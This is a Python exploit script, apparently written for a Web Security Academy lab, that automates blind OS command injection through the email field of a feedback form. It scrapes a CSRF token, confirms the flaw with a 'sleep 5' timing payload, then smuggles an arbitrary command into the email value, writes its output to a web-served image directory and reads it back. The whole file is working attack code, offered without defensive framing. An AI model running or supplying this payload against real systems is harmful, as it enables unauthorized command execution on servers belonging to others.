import requests
import urllib3
import sys
import time
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
data_base = {
	"name" : "test" ,
	"subject" : "test" ,
	"message" : "test"
}

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "http://127.0.0.1:8080"
}

def run_command(url,command,csrf,path2):
	path3 = '/image?filename=out.txt'
	print(f"[+] Executing '{command}' Command")
	data=data_base.copy()
	data["csrf"] = csrf
	data["email"] = "test@test.com;" + command + " > /var/www/images/out.txt"+ ";"
	print(f"[+] Writing Output to /var/www/images/out.txt file")
	response3=session.post(url=url+path2,data=data,verify=False,proxies=proxies)
	print(f"[+] Command Executes Successfully")
	response4=requests.get(url=url+path3,verify=False,proxies=proxies)
	print(f"\n {response4.text}")


def test_vuln(url,command,csrf):
	path2 = '/feedback/submit'
	data = data_base.copy()
	data["csrf"] = csrf
	data["email"] = "test@test.com; sleep 5 ;"
	print(f"[+] Sending 'sleep 5' command to check if email parameter is vulnerable")
	response2=session.post(url=url+path2,data=data,verify=False,proxies=proxies)
	if response2.elapsed.total_seconds() >= 5:
		print(f"[+] Target is Vulnerable to OS Command Injection")
		run_command(url,command,csrf,path2)
	else:
		print(f"Target is Not Vulnerable")


def csrf_token(url,command):
	path1 = '/feedback'
	print(f"[+] Getting CSRF Token")
	response1 = session.get(url+path1,verify=False,proxies=proxies)
	soup = BeautifulSoup(response1.text, "html.parser")
	csrf = soup.find("input",{"name":"csrf"})["value"]
	print(f"[+] CSRF Token is : {csrf}")
	test_vuln(url,command,csrf)



def main():
	if len(sys.argv) != 3 :
		print(f"[+] Usage : {sys.argv[0]} <url> <command>")
		print(f"[+] Example : {sys.argv[0]} https://0000.web-security-academy.net id")
		sys.exit(1)

	url = sys.argv[1]
	command = sys.argv[2]
	csrf_token(url,command)


if __name__ == "__main__":
	main()
